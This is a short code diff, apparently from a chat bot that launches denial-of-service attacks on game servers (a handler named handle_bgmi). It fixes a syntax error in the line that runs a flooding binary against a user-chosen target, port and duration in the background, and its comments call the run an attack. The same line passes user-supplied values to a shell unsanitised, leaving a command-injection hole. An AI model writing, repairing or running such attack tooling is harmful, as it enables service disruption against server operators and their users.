@@ -147,7 +147,7 @@ def handle_bgmi(message):
     log_command(user_id, target, port, time_duration)
 
     try:
-        process = subprocess.Popen(f"./iiipx {target} {port} {time_duration} 900 > /dev/null 2>&1 &", shell=True))
+        process = subprocess.Popen(f"./iiipx {target} {port} {time_duration} 900 > /dev/null 2>&1 &", shell=True)
         process.wait(timeout=time_duration)  # Wait for attack to complete
     except subprocess.TimeoutExpired:
         process.kill()  # Kill if attack takes longer
